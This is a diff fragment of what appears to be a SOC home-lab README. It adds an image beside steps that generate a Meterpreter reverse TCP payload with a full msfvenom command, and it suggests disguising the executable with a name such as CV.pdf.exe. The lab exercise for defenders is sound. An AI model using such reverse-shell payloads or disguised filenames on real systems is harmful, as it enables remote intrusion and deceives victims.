@@ -74,3 +74,5 @@ The payload used in this SOC lab is "windows/x64/meterpreter_reverse_tcp".
 We will generate a reverse TCP shellcode from our Windows VM to Kali VM.  
 In the Kali terminal we can use "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.0.200 lport=4444 -f exe -o Notepad.exe".  
 LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename which can be any name of your choosing eg CV.pdf.exe.  
+<img width="728" height="232" alt="image" src="https://github.com/user-attachments/assets/803f1157-5acb-4880-9490-5e3e998b0105" />
+
